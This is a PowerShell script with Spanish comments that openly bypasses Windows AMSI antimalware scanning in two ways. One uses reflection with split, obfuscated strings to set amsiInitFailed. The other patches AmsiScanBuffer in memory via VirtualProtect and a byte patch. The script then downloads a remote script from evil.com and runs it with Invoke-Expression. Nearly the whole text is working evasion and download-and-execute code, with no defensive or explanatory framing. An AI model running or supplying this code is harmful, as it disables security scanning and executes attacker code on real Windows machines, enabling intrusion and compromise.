# Ofuscación avanzada con bypass AMSI
$k1 = 'Syst'+'em.Management.Automation.'
$k2 = 'amsiIn'+'itFailed'
$k3 = 'NonPublic,Static'

# Bypass AMSI mediante reflexión
$t = [Ref].Assembly.GetType($k1+'AmsiUtils')
$f = $t.GetField($k2, $k3)
$f.SetValue($null, $true)

# Bypass adicional - Parcheo de memoria AMSI
$w = Add-Type -MemberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string lpLibFileName);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32API" -Namespace Kernel32 -PassThru

$lib = $w::LoadLibrary("amsi.dll")
$addr = $w::GetProcAddress($lib, "AmsiScanBuffer")
$oldProtect = 0
$w::VirtualProtect($addr, [UIntPtr]4, 0x40, [Ref]$oldProtect)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)

# Descarga y ejecución ofuscada
$url = "http://evil.com/payload.ps1"
$downloader = "New-Object Net.WebClient"
$method = "DownloadString"
$invoker = "Invoke-Expression"

$content = (& ($downloader -replace ' ','')).($method)($url)
& ($invoker -replace ' ','') $content